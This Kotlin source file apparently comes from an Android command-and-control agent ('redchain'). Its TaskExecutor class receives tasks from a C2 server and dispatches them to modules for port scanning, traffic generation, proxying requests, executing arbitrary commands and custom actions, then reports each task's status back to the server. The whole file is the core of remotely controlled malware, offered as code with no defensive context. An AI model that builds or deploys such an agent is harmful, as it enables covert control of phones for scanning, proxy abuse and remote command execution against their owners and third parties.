package com.redchain.agent.worker

import android.content.Context
import com.redchain.agent.network.C2Client
import com.redchain.agent.modules.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONObject

class TaskExecutor(
    private val context: Context,
    private val c2Client: C2Client
) {

    suspend fun executeTask(task: JSONObject) = withContext(Dispatchers.IO) {
        val taskId = task.getString("task_id")
        val taskType = task.getString("task_type")
        val parameters = task.getJSONObject("parameters")

        // Update status to running
        c2Client.updateTaskStatus(taskId, "running")

        try {
            val result = when (taskType) {
                "port_scan" -> {
                    PortScanModule.execute(parameters)
                }
                "traffic_gen" -> {
                    TrafficGenModule.execute(parameters)
                }
                "proxy_request" -> {
                    ProxyModule.execute(parameters)
                }
                "execute_command" -> {
                    CommandModule.execute(parameters)
                }
                "custom" -> {
                    CustomModule.execute(parameters)
                }
                else -> {
                    JSONObject().apply {
                        put("error", "Unknown task type: $taskType")
                    }
                }
            }

            // Update status to completed
            c2Client.updateTaskStatus(taskId, "completed", result)

        } catch (e: Exception) {
            // Update status to failed
            c2Client.updateTaskStatus(taskId, "failed", error = e.message)
        }
    }
}
